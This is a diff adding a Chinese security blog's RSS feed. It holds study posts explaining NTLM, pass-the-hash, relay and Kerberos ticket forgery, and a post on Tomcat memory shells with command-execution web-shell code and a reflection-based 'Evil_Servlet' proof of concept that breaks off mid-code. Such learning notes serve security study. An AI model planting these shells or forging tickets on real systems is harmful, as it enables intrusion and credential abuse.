@@ -1,0 +1,2416 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Bloyet&#39;s blog</title>
+    <link>https://bloyet.github.io/</link>
+    <description>做那个人的战士，和他一起去经历，失败!</description>
+    <language>zh-cn</language>
+    <generator>Gridea Pro</generator>
+    <lastBuildDate>Fri, 11 Sep 2026 01:49:50 +0800</lastBuildDate>
+    <atom:link href="https://bloyet.github.io/feed.xml" rel="self" type="application/rss+xml"></atom:link>
+    <item>
+      <title>Window认证机制</title>
+      <link>https://bloyet.github.io/post/window-authentication-mechanism/</link>
+      <guid isPermaLink="true">https://bloyet.github.io/post/window-authentication-mechanism/</guid>
+      <pubDate>Fri, 29 May 2026 01:39:20 +0800</pubDate>
+      <description><![CDATA[<p>window的认证主要分为三部分：</p>
+<p>本地认证：用户直接操作计算机登陆账户</p>
+<p>网络认证：远程连接到工作组中的某个设备</p>
+<p>域认证：登陆到域环境中的某个设备</p>
+<h1 id="heading">本地认证</h1>
+<p>用户输入密码，系统收到密码后将用户输入的密码计算成NTLM Hash，然后与sam数据库（%SystemRoot%\system32\config\sam）中该用户的哈希比对，匹配则登陆成功，不匹配则登陆失败</p>
+<p>NTLM Hash：</p>
+<pre><code class="language-java">admin  -&gt; hex(16进制编码) = 61646d696e
+61646d696e -&gt; Unicode = 610064006d0069006e00
+610064006d0069006e00 -&gt; MD4 = 209c6174da490caeb422f3fa5a7ae634
+</code></pre>
+<p>其中 209c6174da490caeb422f3fa5a7ae634 就是NTLM Hash</p>
+<p><font style="color:rgb(36, 41, 46);">winlogon.exe是用来管理用户登录和登出的，相当于就是弹个登录框和登出框，然后接收用户的输入，并将其送给lsass.exe（windows</font><strong><font style="color:rgb(36, 41, 46);">本地</font></strong><font style="color:rgb(36, 41, 46);">安全策略和登录策略）进程，将该</font><font style="color:#DF2A3F;">明文密码</font><font style="color:rgb(36, 41, 46);">加密成</font><font style="color:#DF2A3F;">NTLM Hash</font><font style="color:rgb(36, 41, 46);">和SAM文件中的hash进行对比和认证。</font></p>
+<p><strong>用mimikatz来获取的明文密码，便是在这个进程中读取到的（这个工具的使用在下文会进行补充）</strong></p>
+<blockquote>
+<p>在旧版 Windows（如 Windows 7）中，默认开启的 WDigest 认证机制会让 <code>lsass.exe</code> 在内存中一直保留明文密码，这增加了风险。从 Windows 8.1 和 Windows Server 2012 R2 开始，微软默认禁用了此功能，除非特殊情况，<code>lsass.exe</code> 不会在内存中长期保存明文密码，这提高了系统的安全性 。</p>
+</blockquote>
+<hr />
+<h1 id="heading-1">网络认证</h1>
+<p>网络认证即在工作组环境下远程登陆另一台电脑所采用的认证机制</p>
+<p>NTLM协议的认证过程分为三步，也叫挑战相应机制：</p>
+<p>1.协商</p>
+<p>2.质询</p>
+<p>3.验证</p>
+<p>协商：双方确定使用的协议版本，NTLM存在V1和V2两个版本，具体区别就是加密方式不同</p>
+<p>质询：挑战（Chalenge）/响应（Response）认证机制的核心</p>
+<p>验证：在质询完成后，验证结果，是认证的最后一步。</p>
+<p>具体流程： 主要是质询的这个流程</p>
+<ol>
+<li>
+<p>客户端向服务器端发送用户信息 <font style="color:#DF2A3F;">(用户名)</font> 请求</p>
+</li>
+<li>
+<p>服务器接受到请求，如果存在对应的用户名，生成一个 16 位的随机数，被称之为 “Challenge”， 使用登录用户名对应的 <font style="color:#DF2A3F;">NTLM Hash</font> （这个就是用户名对应的密码 然后进行加密的产物）加密 Challenge (16 位随机字符)， 生成 Challenge1，存储在内存中。同时，生成 Challenge1 后，将 Challenge (16 位随机 字符) 发送给客户端。</p>
+</li>
+<li>
+<p>客户端接受到 Challenge 后，使用将要登录到账户对应的 NTLM Hash 加密 Challenge 生成 Response，然后将 Response 发送至服务器端。</p>
+</li>
+</ol>
+<p>然后 将Response 和 Challenge1 进行比对 一样就完成验证</p>
+<p>其中，经过 NTLM Hash 加密 Challenge 的结果在网络协议中称之为 Net NTLM Hash。</p>
+<h2 id="pth-pass-the-hash--">PTH（ Pass-The-Hash  哈希传递攻击）</h2>
+<p>我们可以看到 这上面学习到的这个网络认证中 从头到尾是都不需要明文密码的，或者说NTLM Hash在网络认证中就相当于明文密码。</p>
+<p><strong><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">在工作组环境中：</font></strong></p>
+<ul>
+<li><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">Windows 2003和之前的机器，可以使用本地管理员组内用户进行攻击。</font></li>
+<li><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">Windows 2003 之后的机器，只能是administrator用户的哈希值才能进行哈希传递攻击，其他用户(包括管理员用户但是非administrator)也不能使用哈希传递攻击，会提示拒绝访问。</font></li>
+</ul>
+<p><strong><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">在域环境中：</font></strong></p>
+<ul>
+<li><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">只能是</font><strong><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">域管理员组内用户</font></strong><font style="color:rgb(34, 34, 34);background-color:rgba(255, 255, 255, 0.9);">(可以是域管理员组内非administrator用户)的哈希值才能进行哈希传递攻击，攻击成功后，可以访问域内任何一台机器。</font></li>
+</ul>
+<p>如果我们拿下了一台内网机器之后， 能使用工具（最著名的如 Mimikatz）读取系统内存中的 <strong>LSASS 进程</strong>（本地安全授权子系统服务）或者导出本地的 <strong>SAM 数据库</strong>。并且成功抓取到了该机器上登录过的高权限用户或者其他用户的 <font style="color:#DF2A3F;">NTLM Hash</font>。  那么我们并不需要去进行还原明文，<font style="color:rgb(31, 31, 31);">将抓取到的 NTLM Hash 直接注入到当前的会话中，或者作为参数传递给攻击工具。攻击工具利用这个 NTLM Hash，自动代替客户端去完成刚才提到的 NTLM 质询/响应，认证通过后就可以在不知道任何明文密码的情况下，成功获得了目标机器的控制权。</font></p>
+<p>如果是NetNTLM Hash  也就是在质询的过程中的产物，这个是不能进行哈希传递攻击的 因为它已经融入了Challenge，我们如果拿到了NetNTLM hash 就只能进行暴力破解，看能否还原NTLM hash或者是 <font style="color:#DF2A3F;">NTLM Relay</font>（中继攻击）</p>
+<h2 id="ntlm-relay">NTLM Relay（中继攻击）</h2>
+<p><a href="https://www.cnblogs.com/kqdssheng/p/18985420">AD 提权-NTLM 中继攻击（强制认证） - 扛枪的书生 - 博客园</a></p>
+<p><font style="color:rgb(31, 31, 31);">想办法让受害者（客户端）主动来连接自己，或者截获受害者发出的请求。</font></p>
+<p><font style="color:rgb(31, 31, 31);">在内网中，攻击者通常会利用局域网的广播协议缺陷（比如伪造 LLMNR / NBT-NS 响应），欺骗受害者说：“我就是你要找的那台服务器（比如文件服务器）”，从而让受害者把 NTLM 认证请求发给攻击者。收到后什么也不做，</font><strong><font style="color:rgb(31, 31, 31);">直接把这个请求转发给目标服务器</font></strong><font style="color:rgb(31, 31, 31);">。目标服务器收到请求，以为是正常用户想登录，于是生成了一个 </font><strong><font style="color:rgb(31, 31, 31);">16字节的 Challenge（挑战值）</font></strong><font style="color:rgb(31, 31, 31);"> 发回来。</font></p>
+<p><font style="color:rgb(31, 31, 31);">攻击者收到这个 Challenge，自己解不开（因为没有密码），于是</font><strong><font style="color:rgb(31, 31, 31);">原封不动地转发给受害者</font></strong><font style="color:rgb(31, 31, 31);">，假装这是自己出的题。受害者收到 Challenge，毫无察觉，老老实实地用自己的 NTLM Hash 对其进行加密，计算出 </font><strong><font style="color:rgb(31, 31, 31);">Response（也就是 NetNTLM Hash）</font></strong><font style="color:rgb(31, 31, 31);">，然后发给攻击者。攻击者拿到了这个极其珍贵的 Response。此时，攻击者</font><strong><font style="color:rgb(31, 31, 31);">立刻将这个 Response 转发给目标服务器</font></strong><font style="color:rgb(31, 31, 31);">。</font></p>
+<p><font style="color:rgb(31, 31, 31);">目标服务器进行验证，发现 Response 完全正确！服务器判定认证成功，</font><strong><font style="color:rgb(31, 31, 31);">为攻击者打开了系统大门</font></strong><font style="color:rgb(31, 31, 31);">。</font></p>
+<h1 id="heading-2">域认证</h1>
+<p><font style="color:rgb(36, 41, 46);">域是windows给大型企业管理资产服务提供一种方式。如果要搭建一个域环境，就必须安装一个活动目录服务。</font></p>
+<h2 id="font-stylecolorrgb36-41-46active-directoryfont"><font style="color:rgb(36, 41, 46);">Active Directory（活动目录）</font></h2>
+<p><font style="color:rgb(31, 31, 31);">活动目录服务以域名来划分域的边界，域外就不属于管理范围了，也就是说，一个域对应一个域名，域之间也可以相互信任。</font></p>
+<p><font style="color:rgb(31, 31, 31);">Active Directory 存储了有关网络对象的信息，并且让管理员和用 户能够轻松地查找和使用这些信息。Active Directory 使用了一种 结构化的数据存储方式，并以此作为基础对目录信息进行合乎逻辑的分层组织。</font></p>
+<p><font style="color:rgb(31, 31, 31);">网络对象分为：用户、用户组、计算机、域、组织单位以及安全 策略等。</font></p>
+<p><font style="color:rgb(31, 31, 31);"></font></p>
+<p><font style="color:rgb(36, 41, 46);">本身网络设备之间是可以互相访问的，这些在域控环境下的网络设备如果要相互访问，认证的协议就是kerberos协议。</font></p>
+<h2 id="---kerbroes">域认证体系 - Kerbroes</h2>
+<p>域内认证即采用了Kerberos协议的认证机制，与前两者相比最大的区别是有个一个可信的第三方机构KDC的参与</p>
+<p>域认证的三个重要角色：</p>
+<ul>
+<li><font style="color:rgb(36, 41, 46);">client</font></li>
+<li><font style="color:rgb(36, 41, 46);">server</font></li>
+<li><font style="color:rgb(36, 41, 46);">KDC（Key Distribution Center）=DC (Domain Controller)</font></li>
+</ul>
+<p>AD，全称叫account database，存储域中所有用户的用户名和对应的NTLM Hash，可以理解为域中的SAM数据库，KDC可以从AD中提取域中所有用户的NTLM Hash，这是Kerberos协议能够成功实现的基础。</p>
+<p>从物理层面看，AD与AS，TGS，KDC均为域控制器(Domain Controller)。</p>
+<p><font style="color:rgb(36, 41, 46);">KDC本身的功能实现是由三部分组成：</font></p>
+<p><strong>Authentication Service（AS）</strong>：用来给 Client 生成 TGT 的。Client 向 AS 发起认证请求，AS 拿着用户名去 AD里查这个用户是否存在，存在就对预认证数据进行验证，验证通过后 AS 生成 TGT（用 KRBTGT 密钥加密）返回给Client。整个认证过程中，只有 AS 能签发 TGT。</p>
+<p><strong>Ticket Granting Service（TGS）</strong>：用来给 Client 生成 ST（Service Ticket / 服务票据）的。Client 拿着 AS 发的 TGT +要访问的目标服务 SPN 向 TGS 发起请求，TGS 用 KRBTGT 密钥解出 TGT 内容，确认 Client身份合法后，用目标服务自身的密钥加密生成一个新的 ST 返回给 Client。Client 每次访问不同的服务都要找 TGS 单独申请对应的ST，同一个 TGT 可以反复使用、多次找 TGS 换不同服务的 ST。</p>
+<p><strong>Account Database（AD）</strong>：存储着所有域内账号信息（用户名、密码哈希、SID、组关系等），是 AS 和 TGS查询身份合法性、生成票据时的数据源。这里的 AD 指的是 KDC 内部的账号数据库，包含在 Active Directory体系内，两者在实际使用中统称 AD 即可。</p>
+<h3 id="font-stylecolorrgb51-51-51kerberos-font"><strong><font style="color:rgb(51, 51, 51);">Kerberos 认证机制流程</font></strong></h3>
+<p><strong><font style="color:rgb(51, 51, 51);">第一阶段：AS 认证（获取 TGT）</font></strong></p>
+<p><strong><font style="color:rgb(51, 51, 51);">AS-REQ</font></strong><font style="color:rgb(51, 51, 51);">：Client 向 KDC 发送认证请求，内容包括自己的用户名以及用 Client NTLM Hash 加密的时间戳（预认证数据）。KDC 交由 AS 根据用户名在 AD 中查找该 Client 是否存在（白名单验证），并在本地提取出对应的 NTLM Hash，用该 Hash 解密时间戳以验证 Client 身份。</font></p>
+<p><strong><font style="color:rgb(51, 51, 51);">AS-REP</font></strong><font style="color:rgb(51, 51, 51);">：验证通过后，KDC（AS）随机生成一段字符串，叫做 </font><strong><font style="color:rgb(51, 51, 51);">Session Key</font></strong><font style="color:rgb(51, 51, 51);">，用 Client 的 NTLM Hash 加密后返回给 Client——这段加密的 Session Key 就是 Client 之后跟 TGS 通信的凭证。同时，KDC 用 </font><strong><font style="color:rgb(51, 51, 51);">KRBTGT 账户的 NTLM Hash</font></strong><font style="color:rgb(51, 51, 51);"> 对 Session Key 和 Client 信息（SID、所属组等，即 PAC）进行加密，生成 </font><strong><font style="color:rgb(51, 51, 51);">TGT</font></strong><font style="color:rgb(51, 51, 51);">。此时 KDC 生成了两份加密内容：</font></p>
+<ul>
+<li><strong><font style="color:rgb(51, 51, 51);">AS 内容</font></strong><font style="color:rgb(51, 51, 51);">：用 Client Hash 加密的 Session Key，Client 自己能解开，是后续访问 TGS 的凭证。</font></li>
+<li><strong><font style="color:rgb(51, 51, 51);">TGT 内容</font></strong><font style="color:rgb(51, 51, 51);">：用 KRBTGT Hash 加密的 Session Key + Client 信息，Client 解不开，必须原封不动交给 TGS。</font></li>
+</ul>
+<p><font style="color:rgb(51, 51, 51);">这两份内容一并返回给 Client。TGT 默认有效期 10 小时。</font></p>
+<p><font style="color:rgb(51, 51, 51);">第一阶段的目的是：</font><strong><font style="color:rgb(51, 51, 51);">验证 Client 是个合法域用户</font></strong><font style="color:rgb(51, 51, 51);">，核心依赖 AS 在 AD 中的白名单查询。操作主体是 AS，攻击面相对有限。</font></p>
+<p><font style="color:rgb(51, 51, 51);">Client 拿到 TGT 和用自己 NTLM Hash 加密的 Session Key 密文后，用自己的 Hash 解密得到 Session Key 明文。TGT 由于是 KRBTGT Hash 加密的，中间人即使获取到，没有 KRBTGT 的 Hash 也很难爆破。TGT 本质上就是 KDC 发的&quot;身份通行证&quot;，有这个 TGT 才能向 TGS 提后续请求。</font></p>
+<p><strong><font style="color:rgb(51, 51, 51);">第二阶段：TGS 认证（获取 ST / Service Ticket）</font></strong></p>
+<p><strong><font style="color:rgb(51, 51, 51);">TGS-REQ</font></strong><font style="color:rgb(51, 51, 51);">：Client 用自己解密出的 Session Key 加密三部分内容：</font><strong><font style="color:rgb(51, 51, 51);">自身客户端信息 + 目标服务的 SPN + 时间戳</font></strong><font style="color:rgb(51, 51, 51);">，将这段密文连同之前拿到的 TGT 一起发给 KDC。</font></p>
+<p><strong><font style="color:rgb(51, 51, 51);">TGS-REP</font></strong><font style="color:rgb(51, 51, 51);">：KDC（TGS）收到数据后：</font></p>
+<ol>
+<li><font style="color:rgb(51, 51, 51);">用 KRBTGT Hash 解密 TGT，从中提取出 Session Key 和 Client 的 PAC 信息。</font></li>
+<li><font style="color:rgb(51, 51, 51);">用这个 Session Key 去解密 Client 发来的加密数据（时间戳 + Client 信息 + 目标 SPN），验证 Client 身份和时间戳有效性。</font></li>
+<li><font style="color:rgb(51, 51, 51);">验证通过后，TGS 新生成一个 </font><strong><font style="color:rgb(51, 51, 51);">Server Session Key</font></strong><font style="color:rgb(51, 51, 51);">，从 AD 中找到目标服务（SPN 对应）的 NTLM Hash，用该 Server Hash 对三部分内容进行综合加密：</font><strong><font style="color:rgb(51, 51, 51);">Server Session Key + Client 信息 + 到期时间</font></strong><font style="color:rgb(51, 51, 51);">。这份密文就是 </font><strong><font style="color:rgb(51, 51, 51);">ST（Service Ticket / 服务票据）</font></strong><font style="color:rgb(51, 51, 51);">，是 Client 最后访问目标 Server 的凭证。</font></li>
+</ol>
+<p><font style="color:rgb(51, 51, 51);">TGS 最终返回给 Client 的是：</font></p>
+<ul>
+<li><strong><font style="color:rgb(51, 51, 51);">Server Session Key</font></strong><font style="color:rgb(51, 51, 51);">（用 Session Key 加密，Client 能解开）。</font></li>
+<li><strong><font style="color:rgb(51, 51, 51);">ST</font></strong><font style="color:rgb(51, 51, 51);">（用目标 Server 的 NTLM Hash 加密，Client 解不开）。</font></li>
+</ul>
+<p><font style="color:rgb(51, 51, 51);">这里的关键：ST 是用 Server 的 Hash 加密的，中间人即使抓到也没有 Server Hash，难以提取有效信息。同一个 TGT 可以多次找 TGS 申请不同 SPN 的 ST——访问几个服务就申请几次。</font></p>
+<p><strong><font style="color:rgb(51, 51, 51);">第三阶段：AP 认证（Client 访问 Server）</font></strong></p>
+<p><strong><font style="color:rgb(51, 51, 51);">AP-REQ</font></strong><font style="color:rgb(51, 51, 51);">：Client 用 Server Session Key 加密</font><strong><font style="color:rgb(51, 51, 51);">自身客户端信息 + 时间戳</font></strong><font style="color:rgb(51, 51, 51);">，将这段密文连同之前拿到的 ST 一起发给目标 Server。</font></p>
+<p><strong><font style="color:rgb(51, 51, 51);">AP-REP</font></strong><font style="color:rgb(51, 51, 51);">：Server 用自己的 NTLM Hash（存在本地 LSASS 内存中）解密 ST，从中提取出 Server Session Key 和 Client 信息，再用这个 Server Session Key 解密 Client 发来的时间戳。对比时间戳有效且 Session Key 匹配后，认证 Client 身份通过，授予访问权限。</font></p>
+<p><font style="color:rgb(51, 51, 51);">总结：</font><strong><font style="color:rgb(51, 51, 51);">AS 发 TGT（你谁），TGS 发 ST（你能访问谁），Server 验 ST（放你进来）</font></strong><font style="color:rgb(51, 51, 51);">。TGT 只有 AS 能发且全局唯一，ST 访问不同服务每次都要找 TGS 单独申请。</font></p>
+<p><strong><font style="color:rgb(26, 28, 31);">Windows 域认证的核心是 Kerberos：用户先向域控拿 TGT，再用 TGT 换访问具体服务的 Service Ticket，最后把 Service Ticket 交给目标服务完成认证。域控负责证明身份，票据负责传递身份和权限，目标服务根据票据和 ACL 决定是否允许访问。</font></strong></p>
+<h3 id="heading-3">白银票据</h3>
+<p>从上面流程可知：目标server 它是校验 ST 的，通过则能访问，而ST是用目标 server 的**<font style="color:rgb(51, 51, 51);">Server NTLM Hash</font><strong><font style="color:rgb(51, 51, 51);"> 加密的 </font></strong><font style="color:rgb(51, 51, 51);">Server Session Key + Client 信息 + 到期时间</font><strong><font style="color:rgb(51, 51, 51);">。 解密时：是用服务器自己的NTML解密出ST，拿到其中的</font></strong><font style="color:rgb(51, 51, 51);">Server Session Key，</font>**<font style="color:rgb(51, 51, 51);">在用Session key 去解密 发来的时间戳</font></p>
+<p><font style="color:rgb(51, 51, 51);">那就意味着，如果我们能拿到目标server的NTLM Hash，我们便完全可以进行伪造ST。可以直接在其中包含一个假的Session key，然后用目标server的NTLM Hash 进行加密，解密时，也是用提取出的这个假Session key 进行解密 客户端发来的时间戳，而客户端发送的加密时间戳，我们直接用这个假的Session key进行加密时间戳，便完成了伪造。</font></p>
+<h3 id="heading-4">黄金票据</h3>
+<p>黄金票据是发生在第一阶段，如果知道 <strong><font style="color:rgb(51, 51, 51);">KRBTGT 账户的 NTLM Hash，</font></strong><font style="color:rgb(51, 51, 51);">我们可以进行伪造TGT。还是一样的原理，TGT中包含Session key，TGS 接收到TGT后，使用</font><strong><font style="color:rgb(51, 51, 51);">KRBTGT 账户的 NTLM Hash </font></strong><font style="color:rgb(51, 51, 51);">解密拿到Session key ，用这个Session key 去解密 客户端发来的 时间戳 和 客户端的信息。那么我们可以 填上假的Session key 和 任意用户的PAC，使用</font><strong><font style="color:rgb(51, 51, 51);">KRBTGT 账户的 NTLM Hash </font></strong><font style="color:rgb(51, 51, 51);">进行加密，然后伪造出TGT，同样 Client  用假的 Session key加密三部分内容：</font><strong><font style="color:rgb(51, 51, 51);">任意用户的信息 和时间戳等等</font></strong><font style="color:rgb(51, 51, 51);">，将这段密文连同之前拿到的 TGT 一起发给 KDC。这样就可以伪造任意用户身份了。</font></p>
+<p><font style="color:rgb(51, 51, 51);"></font></p>
+<h3 id="font-stylecolorrgb51-51-51-font"><font style="color:rgb(51, 51, 51);">钻石票据 </font></h3>
+<p><font style="color:rgb(51, 51, 51);">钻石票据属于黄金票据的进阶用法，黄金票据是拿到</font><strong><font style="color:rgb(51, 51, 51);">KRBTGT 账户的 NTLM Hash</font></strong><font style="color:rgb(51, 51, 51);">后从头伪造一个TGT，实际上并没有经过KDC 的AS链，更容易被发现，而钻石票据是先申请一个合法的TGT 或者 抓取到一个合法的TGT，然后解密后，再去篡改其中的PAC信息，然后重新加密回去，这样就伪造了一个TGT，和黄金票据的区别点就是在于隐蔽性上，有没有经过真实的签发TGT。</font></p>
+<p><strong><font style="color:rgb(26, 28, 31);">Golden Ticket = 拿 </font><strong><strong><font style="color:rgb(26, 28, 31);">krbtgt</font></strong></strong><font style="color:rgb(26, 28, 31);"> key 后从零伪造 TGT，没真实 AS 签发链，较容易被发现。</font></strong><br />
+<strong><font style="color:rgb(26, 28, 31);">Diamond Ticket = 先拿真实 TGT，再改 PAC 重新封装，有真实签发痕迹，更隐蔽。</font></strong></p>
+<h3 id="font-stylecolorrgb51-51-51font"><font style="color:rgb(51, 51, 51);">蓝宝石票据</font></h3>
+<p>蓝宝石票据则是 钻石票据的升级版。可以看到钻石票据其中的PAC信息还是进行伪造的，而蓝宝石票据则是：通过<font style="color:rgb(26, 28, 31);">S4U2Self + U2U 获取到 真实用户的 PAC信息进行替换，也就是说 所有信息都是真的，只不过是被我们 进行 &ldquo;拼接&rdquo; 在了一起导致的伪造</font><font style="color:rgb(26, 28, 31);">。</font>生成的票据是合法元素的集合，并遵循标准票据请求，这使得它成为最难检测的银/金票据变体。</p>
+<p><strong><font style="color:rgb(26, 28, 31);">S4U2Self</font></strong><font style="color:rgb(26, 28, 31);"> ：一个服务用自己的 TGT，向 KDC 请求“某个用户访问我这个服务”的 Service Ticket。如何理解呢，就是正常情况下是 客户端主动去KDC申请到ST，而用S4U2Self则是 服务端主动申请帮客户端申请一张ST 让客户端有权限访问自己</font></p>
+<p><strong><font style="color:rgb(26, 28, 31);">U2U</font></strong><font style="color:rgb(26, 28, 31);">：ST原本是需要用服务器的NTLM hash 进行加密的，但是使用U2U，则可以变更为使用 当前 TGT 的 session key 加密，而 TGT是 </font><font style="color:rgb(51, 51, 51);">用 KRBTGT Hash 加密的。</font></p>
+<p><font style="color:rgb(51, 51, 51);"></font></p>
+<p><font style="color:rgb(51, 51, 51);">S4U2Self 决定“票里是谁的 PAC”，U2U 决定“这张票能不能被我们解开”。</font></p>
+<p><font style="color:rgb(51, 51, 51);"></font></p>
+<p><font style="color:rgb(51, 51, 51);">所以说连起来是怎么一回事呢：</font>攻击者控制 A，并拥有 krbtgt key。攻击者让 A 拿到一个 TGT，然后使用 S4U2Self + U2U 请求一张 ST(DA -&gt; A)。由于启用了 U2U，这张 ST 使用 A_TGT_session_key 加密。攻击者可以通过已有的 session key，或者用 krbtgt key 解开 A 的 TGT 取出 session key，再解开 ST，提取其中的 PAC(DA)。之后将这个真实的 PAC(DA) 替换/拼接进伪造的 TGT 中，并用 krbtgt key 重新签名和加密，最终得到一个包含真实域管 PAC 的 TGT。因此，U2U 的核心作用不是获取 PAC，而是让返回的 ST 可以被攻击者用 TGT session key 解开，从而读取其中的真实 PAC。如果攻击者已经知道 A 的对应长期密钥，并且 ST 使用该密钥类型加密，那么不用 U2U 也可以解 ST；但在不知道服务长期密钥、只掌握 TGT/session key/krbtgt key 的情况下，U2U 就是关键。</p>
+]]></description>
+    </item>
+    <item>
+      <title>内存马回显以及反序列化注入</title>
+      <link>https://bloyet.github.io/post/nei-cun-ma-hui-xian-yi-ji-fan-xu-lie-hua-zhu-ru/</link>
+      <guid isPermaLink="true">https://bloyet.github.io/post/nei-cun-ma-hui-xian-yi-ji-fan-xu-lie-hua-zhu-ru/</guid>
+      <pubDate>Thu, 04 Sep 2025 01:30:47 +0800</pubDate>
+      <description><![CDATA[<p>像我们之前通过jsp文件获取的request对象，那么获得回显就很容易了，jsp中内置的request对象，我们可以直接进行调用</p>
+<p>随便一个内存马把之前的直接命令执行 换成通过response来输出 出来，我们就可以看到命令的回显了</p>
+<pre><code class="language-java">String cmd = request.getParameter(&quot;cmd&quot;);
+response.setContentType(&quot;text/html; charset=UTF-8&quot;);
+PrintWriter writer = response.getWriter();
+if (cmd != null) {
+    try {
+        InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();
+
+        //将命令执行结果写入扫描器并读取所有输入
+        Scanner scanner = new Scanner(in).useDelimiter(&quot;\\A&quot;);
+        String result = scanner.hasNext()?scanner.next():&quot;&quot;;
+        scanner.close();
+        writer.write(result);
+        writer.flush();
+        writer.close();
+    } catch (IOException e) {
+        e.printStackTrace();
+    } catch (NullPointerException n) {
+        n.printStackTrace();
+    }
+}
+
+}
+</code></pre>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012949956_00054.png" alt="" /></p>
+<p>问题是 打内存马 大多数是通过反序列化来打的，就没有这样直接的request的对象使用了</p>
+<p>有大佬提供的思路：</p>
+<h1 id="font-stylecolorrgb36-41-46threadlocal-response-font"><font style="color:rgb(36, 41, 46);">ThreadLocal Response 回显</font></h1>
+<h2 id="threadlocal-">ThreadLocal 是什么</h2>
+<p>ThreadLocal 是 Java 中的一个工具类，位于 java.lang 包中，主要用于为每个线程提供独立的变量副本。简单来说，就是每个线程通过 ThreadLocal 访问到的是属于自己线程的独立副本，而不是共享的一个对象。</p>
+<p>思路来自于@kingkk师傅</p>
+<p>首先要注意的是，我们寻找的request对象应该是一个和当前线程ThreadLocal有关的对象。这样才能获取到当前线程的相关信息。最终我们能够在org.apache.catalina.core.ApplicationFilterChain类中找到这样两个变量lastServicedRequest和lastServicedResponse。并且这两个属性还是静态的，我们获取时无需实例化对象。</p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012951938_00055.png" alt="" /></p>
+<p>在internalDoFilter方法中，经过if语句 之后先回进行一个判断，然后把<font style="color:rgb(36, 41, 46);">response 以及 request 取出来</font></p>
+<p><img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012953592_00056.png" alt="" /></p>
+<p>整理一下思路：</p>
+<p>我们需要反射修改ApplicationDispatcher.WRAP_SAME_OBJECT为**<font style="color:#DF2A3F;">true</font>**</p>
+<p><font style="color:rgb(36, 41, 46);">response 以及 request 取出来是在其中责任链实现逻辑中 internalDofilter 的部分，当我们从filterCofigs 中读取完所有的 filterConfig 配置，并且走完它们的所有逻辑之后发生的（逻辑是doFilter()-&gt;internalDoFilter()-&gt;调用doFilter链-&gt;调用set方法，把response 以及 request 取出来-&gt;service()方法，这也是</font><strong><font style="color:#DF2A3F;">局限性</font></strong><font style="color:rgb(36, 41, 46);">所在了），而我们注入命令执行的位置其实是在service()中然后调用到doget方法中，第一次在我们设置为true的时候（默认是false的），也是不会有回显的，因为此时还没获取到request（是已经判断完之后，才在service中修改为true的）。</font></p>
+<p><font style="color:rgb(36, 41, 46);">所以我们的逻辑应该是第一次让它判断条件变成true，然后在第二次请求的时候就可以获取到request，然后通过判断 ApplicationDispatcher.WRAP_SAME_OBJECT是否为</font><strong><font style="color:#DF2A3F;">true </font></strong>，如果不为true，我们就反射字段，设置为true以及把变量进行**<font style="color:#DF2A3F;">初始化</font>**，然后如果为true了，说明之前已经进行过获取request对象了，然后在走命令执行回显的逻辑</p>
+<p>反射的知识点，我们通过反射只能拿到类似于一个这个类型的变量，并不是它的真实值（作者的自我补充知识点）</p>
+<p>还有一个点就是为什么要对lastServicedRequest和lastServicedResponse这两个变量进行初始化，其实是因为在Tomcat初始化的时候会把他们的值设置为null，所以我们需要反射设置为new ThreadLocal<ServletRequest>()，然后被set了request，然后我们在get取出来就得到了我们需要的值了，如果没有设置值，就会出现空指针异常</p>
+<p>而且<code>lastServicedRequest</code>和<code>lastServicedResponse</code>,以及 <code>ApplicationDispatcher.WRAP_SAME_OBJECT</code>变量都是final 修饰，也就是不可修改的定值，这对于我们反序列化打入内存马非常不利，所以我们还需要通过反射修改其 final 属性</p>
+<p><font style="color:rgb(36, 41, 46);">上述利用存在两个个利用条件：</font><br />
+<font style="color:rgb(36, 41, 46);">一是 JDK 在 17 版本之后不能够通过反射去修改 final 属性值。也就是在 Springboot3 或者 Spring6 这种内置要求 JDK17 版本之后的服务都不能通过这种方式打入内存马</font><br />
+<font style="color:rgb(36, 41, 46);">二是 tomcat10.1.x 之后的版本（也就是 Springboot3 要求的版本），判断条件也发生了变化</font><br />
+<img src="https://raw.githubusercontent.com/bloyet/tupian/main/20260911012955514_00057.png" alt="" /><br />
+<font style="color:rgb(36, 41, 46);">所以利用场景限制于 Tomcat&lt;10 ，JDK&lt;17 的情况，具体一点就是 Springboot2，spring5，以及版本符合条件的 javaweb 环境等</font></p>
+<p>整理完一些小细节和思路，就直接上POC了：</p>
+<p>里面细节很多 第一次写 也是有点难度的 java基础还是没打牢，参考大佬poc吧</p>
+<pre><code class="language-java">package Filter;
+
+import org.apache.catalina.core.ApplicationFilterChain;
+
+import javax.servlet.*;
+import javax.servlet.annotation.WebFilter;
+import javax.servlet.annotation.WebServlet;
+import javax.servlet.http.HttpServlet;
+import javax.servlet.http.HttpServletRequest;
+import javax.servlet.http.HttpServletResponse;
+import javax.swing.plaf.synth.SynthRadioButtonMenuItemUI;
+import java.io.FileDescriptor;
+import java.io.IOException;
+import java.io.InputStream;
+import java.io.PrintWriter;
+import java.lang.reflect.Field;
+import java.lang.reflect.Modifier;
+import java.util.Scanner;
+
+@WebServlet(&quot;/evil&quot;)
+public class Evil_Servlet extends HttpServlet {
+    @Override
+    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
+        try{
+            //反射获取WRAP_SOME_OBJECT_FIELD lastServicedRequest lastServicedResponse
+            Field WRAP_SOME_OBJECT_FIELD=Class.forName(&quot;org.apache.catalina.core.ApplicationDispatcher&quot;).getDeclaredField(&quot;WRAP_SAME_OBJECT&quot;);
+            Field lastServicedRequestfield=ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedRequest&quot;);
+            Field lastServicedResponsefield=ApplicationFilterChain.class.getDeclaredField(&quot;lastServicedResponse&quot;);
+            WRAP_SOME_OBJECT_FIELD.setAccessible(true);
+            lastServicedRequestfield.setAccessible(true);
